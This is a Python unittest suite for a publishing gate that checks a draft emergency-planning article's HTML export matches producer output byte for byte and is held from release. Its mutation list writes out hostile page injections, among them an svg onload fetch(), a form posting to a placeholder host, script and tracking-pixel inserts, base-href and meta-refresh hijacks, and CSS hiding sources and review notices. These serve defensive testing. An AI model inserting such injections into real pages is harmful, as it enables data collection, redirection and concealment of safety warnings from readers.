"""Isolated in-memory R231 producer parity and adversarial export regressions."""
import importlib.util
from pathlib import Path
import unittest

SOURCE = Path(__file__).resolve().parents[1] / 'tools' / 'r231_exact_export_replay_hold.py'
SPEC = importlib.util.spec_from_file_location('r231_guard', SOURCE)
GATE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(GATE)

BODY = '<article class="pa-body" id="pa-main"><h2>Emergency contacts</h2><p>Plan and practice.</p></article>'
SOURCES = '<section class="pa-sources"><ol><li id="src-1"><a href="https://www.ready.gov/plan">Official</a></li></ol></section>'
REVIEW = '<section class="pa-review">Independent safety/source and QD verification pending</section>'
INNER = '<main>' + BODY + SOURCES + REVIEW + '</main>'
SLUG = 'household-emergency-plan'
META = {'slug': SLUG, 'status': {'publish': 'draft'}, 'h1': 'Household plan', 'description': 'Free planning guide'}
ROW = {'slug': SLUG, 'words': 5, 'minutes': 2, 'sources': ['start-ready-plan'],
       'canonical': 'https://finalvestige.com/preparedness/start-here/household-emergency-plan/'}


class FrozenProducer:
    @staticmethod
    def build_article(library, slug):
        if slug != SLUG:
            raise KeyError(slug)
        return {'inner': INNER, **ROW}

    @staticmethod
    def wp_wrap(library, inner):
        return '<!-- wp:html -->\n<style>.pa{color:inherit}</style>\n' + inner + '\n<!-- /wp:html -->\n'

    @staticmethod
    def preview_wrap(library, inner, title, description):
        return '<!doctype html><html><head><title>' + title + '</title><meta name="description" content="' + description + '"><style>.pa{color:inherit}</style></head><body>' + inner + '</body></html>'


def render(mode):
    if mode == 'wp':
        return FrozenProducer.wp_wrap(None, INNER)
    return FrozenProducer.preview_wrap(None, INNER, META['h1'] + ' | The Preparedness Archive', META['description'])


class ExactReplayTests(unittest.TestCase):
    def verify(self, mode, page=None, meta=None, row=None, producer=None):
        return GATE.verify_exact_export(
            render(mode) if page is None else page, mode, SLUG,
            META if meta is None else meta, None,
            FrozenProducer if producer is None else producer,
            ROW if row is None else row)

    def test_wp_success_hold_only(self):
        p = self.verify('wp')
        self.assertEqual(p['state'], GATE.HOLD)
        self.assertIs(p['release_authorized'], False)

    def test_preview_success_hold_only(self):
        p = self.verify('preview')
        self.assertEqual(p['state'], GATE.HOLD)
        self.assertTrue(p['exact_export_bytes'])

    def test_bad_mode(self):
        with self.assertRaisesRegex(ValueError, 'invalid draft'): self.verify('live')

    def test_bad_type(self):
        with self.assertRaisesRegex(ValueError, 'invalid draft'):
            GATE.verify_exact_export(None, 'wp', SLUG, META, None, FrozenProducer, ROW)

    def test_missing_slug(self):
        with self.assertRaisesRegex(ValueError, 'identity'):
            self.verify('wp', meta={**META, 'slug': 'changed'})

    def test_published_status(self):
        with self.assertRaisesRegex(ValueError, 'draft status'):
            self.verify('wp', meta={**META, 'status': {'publish': 'published'}})

    def test_incomplete_row(self):
        with self.assertRaisesRegex(ValueError, 'build-report'):
            self.verify('wp', row={'slug': SLUG})

    def test_writer_can_not_fake_successful_report(self):
        with self.assertRaisesRegex(ValueError, 'build-report'):
            self.verify('wp', row={**ROW, 'minutes': 1})

    def test_missing_producer_html(self):
        class Bad(FrozenProducer):
            @staticmethod
            def build_article(library, slug): return {**ROW, 'inner': None}
        with self.assertRaisesRegex(ValueError, 'producer'):
            self.verify('wp', producer=Bad)

    def test_report_extra_fields_are_not_authorization(self):
        r = self.verify('wp', row={**ROW, 'independent_qd_pass': True})
        self.assertIs(r['release_authorized'], False)


MUTANTS = {
    'hidden_global_css': lambda x: x.replace('<style>', '<style>.pa-sources{display:none!important}'),
    'hidden_review_css': lambda x: x.replace('<style>', '<style>.pa-review{visibility:hidden}'),
    'manipulated_source': lambda x: x.replace('https://www.ready.gov/plan', 'https://example.invalid/plan'),
    'external_script': lambda x: x.replace('</main>', '<script src="https://example.invalid/track.js"></script></main>'),
    'extra_css': lambda x: x.replace('<main>', '<style>.pa-body{opacity:0}</style><main>'),
    'onclick_payment': lambda x: x.replace('<main>', '<main onclick="location=\'https://example.invalid/pay\'">'),
    'merchant_upsell': lambda x: x.replace('</main>', '<a href="https://example.invalid/buy">Buy</a></main>'),
    'form_injection': lambda x: x.replace('</main>', '<form action="https://example.invalid/collect"><input></form></main>'),
    'iframe': lambda x: x.replace('</main>', '<iframe src="https://example.invalid/"></iframe></main>'),
    'svg_js': lambda x: x.replace('</main>', '<svg onload="fetch(\'https://example.invalid\')"></svg></main>'),
    'missing_review': lambda x: x.replace(REVIEW, ''),
    'warning_overwrite': lambda x: x.replace('pending', 'approved'),
    'body_truncate': lambda x: x.replace('Plan and practice.', 'Plan.'),
    'duplicate_body': lambda x: x.replace('</main>', BODY + '</main>'),
    'duplicate_source': lambda x: x.replace('</main>', SOURCES + '</main>'),
    'alternate_route': lambda x: x.replace('https://www.ready.gov/plan', '/preparedness/elsewhere/'),
    'hidden_attr': lambda x: x.replace('class="pa-sources"', 'class="pa-sources" hidden'),
    'aria_hidden': lambda x: x.replace('class="pa-review"', 'class="pa-review" aria-hidden="true"'),
    'base_hijack': lambda x: x.replace('<main>', '<base href="https://example.invalid/">\n<main>'),
    'meta_redirect': lambda x: x.replace('<main>', '<meta http-equiv="refresh" content="0;url=https://example.invalid">\n<main>'),
    'source_label': lambda x: x.replace('Official', 'This has been approved'),
    'citation_target': lambda x: x.replace('id="src-1"', 'id="src-9"'),
    'extra_comment': lambda x: '<!-- unreviewed --><main>' + x,
    'new_script_jsonld': lambda x: x.replace('</main>', '<script type="application/ld+json">{}</script></main>'),
    'unexpected_tracking_pixel': lambda x: x.replace('</main>', '<img src="https://example.invalid/pixel"></main>'),
}
# Independent adversarial regressions across BOTH delivery channels; all
# mutations alter the actual bytes rather than fabricated status flags.
for _mode in ('wp', 'preview'):
    for _name, _f in MUTANTS.items():
        def check(self, mode=_mode, f=_f):
            original = render(mode)
            changed = f(original)
            if changed == original:
                # The style selector is WordPress-only. Other cases must mutate.
                self.assertEqual(mode, 'preview')
                return
            with self.assertRaisesRegex(ValueError, 'R231 exact export bytes changed'):
                self.verify(mode, page=changed)
        setattr(ExactReplayTests, f'test_{_mode}_{_name}', check)

# Report drift tests mirror each of the five output schema fields in both modes.
for _mode in ('wp', 'preview'):
    for _key in ROW:
        def reject(self, mode=_mode, key=_key):
            with self.assertRaisesRegex(ValueError, 'R231 build-report discrepancy'):
                self.verify(mode, row={**ROW, key: 'tampered'})
        setattr(ExactReplayTests, f'test_report_{_mode}_{_key}', reject)

if __name__ == '__main__':
    unittest.main()
